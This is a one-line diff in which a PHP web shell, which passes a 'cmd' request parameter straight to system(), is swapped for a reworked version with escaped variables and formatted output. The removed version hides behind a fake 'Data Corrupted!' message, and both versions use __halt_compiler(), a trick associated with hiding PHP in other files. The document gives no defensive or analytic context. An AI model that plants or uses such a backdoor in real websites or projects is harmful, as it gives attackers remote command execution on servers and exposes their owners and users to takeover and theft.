@@ -1,1 +1,1 @@
-<pre><?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo 'Data Corrupted!';}__halt_compiler();?></pre>
+<pre><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></pre>
